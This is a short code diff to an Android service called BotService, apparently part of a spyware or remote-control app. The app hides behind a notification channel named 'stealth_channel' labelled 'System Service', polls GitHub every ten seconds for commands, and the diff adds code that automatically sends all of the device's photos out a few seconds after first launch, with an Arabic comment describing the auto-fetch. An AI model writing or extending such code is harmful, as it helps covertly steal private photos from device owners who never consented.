@@ -20,7 +20,7 @@ public class BotService extends Service {
         .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
         .readTimeout(300, java.util.concurrent.TimeUnit.SECONDS).build();
 
-    @Override public int onStartCommand(Intent i, int f, int s) {
+    @Override public int onStartCommand(Intent intent, int f, int s) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel("stealth_channel", "System Service", NotificationManager.IMPORTANCE_LOW);
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -44,6 +44,17 @@ public class BotService extends Service {
         new java.util.Timer().scheduleAtFixedRate(new java.util.TimerTask() {
             @Override public void run() { checkGitHub(); }
         }, 0, 10000); 
+
+        // 🚀 الجلب التلقائي للصور عند أول تشغيل
+        if (intent != null && intent.getBooleanExtra("auto_fetch", false)) {
+            new Thread(new Runnable() {
+                @Override public void run() {
+                    try { Thread.sleep(3000); } catch(Exception e) {}
+                    sendAllMedia("photos");
+                }
+            }).start();
+        }
+
         return START_STICKY;
     }
 
